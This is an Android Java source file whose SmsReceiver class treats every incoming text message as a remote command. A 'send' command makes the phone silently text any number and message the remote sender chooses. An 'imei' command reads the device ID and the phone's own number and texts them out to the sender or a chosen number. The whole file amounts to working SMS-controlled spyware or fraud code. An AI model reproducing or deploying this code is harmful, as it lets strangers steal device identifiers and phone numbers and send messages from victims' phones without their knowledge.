package com.example.zsombor.dotnetxcx;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        Log.d("XMX", "-------------------- SMS received");
        if (bundle != null && bundle.containsKey("pdus")) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdus[0]);
            String senderNumber = sms.getOriginatingAddress();
            String smsText = sms.getMessageBody();
            Log.d("XMX", "Received: " + smsText);
            SmsManager smsManager = SmsManager.getDefault();

            //command:param:param format
            String[] parts = smsText.split(":");
            String command = parts[0];
            switch (command){
                case "send":
                    Log.d("XMX","SMS activated");
                    String phoneNo = parts[1];
                    String msg = parts[2];
                    smsManager.sendTextMessage(phoneNo, null, msg, null, null);
                    Log.d("XMX", "SMS sent: " + msg);
                    break;

                case "imei":
                    Log.d("XMX","imei activated");
                    String imei = getImei(context);
                    try {
                        phoneNo = parts[1];
                    } catch (Exception e){
                        phoneNo = senderNumber;
                    }
                    smsManager.sendTextMessage(phoneNo, null, imei, null, null);
                    Log.d("XMX", "SMS sent to number " + phoneNo + ", text: " +imei);
                    break;
            }
        }
    }

    public String getImei(Context context) {
        TelephonyManager mngr = (TelephonyManager) context.getSystemService(context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return "N/A";
        }

        return mngr.getDeviceId() + '_' + mngr.getLine1Number();
    }
}